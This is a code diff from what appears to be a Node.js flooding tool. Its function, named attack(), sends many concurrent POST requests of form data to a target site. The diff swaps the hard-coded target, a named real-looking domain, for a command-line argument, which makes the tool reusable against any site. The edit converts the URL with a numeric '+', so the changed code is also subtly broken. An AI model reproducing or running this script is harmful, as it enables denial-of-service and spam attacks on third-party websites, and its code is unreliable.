@@ -3,6 +3,7 @@ const fs = require('fs');
 const qs = require('querystring');
 const _ = require('underscore');
 
+const _url = +process.argv[process.argv.length - 2];
 const threadsCount = +process.argv[process.argv.length - 1];
 
 const headers = {
@@ -36,7 +37,6 @@ function attack() {
     form: data,
     headers: headers
   };
-  const _url = 'http://dnr24.com/';
   request(_url, options, function (err, res) {
     count++;
     if (err || 200 !== res.statusCode) {
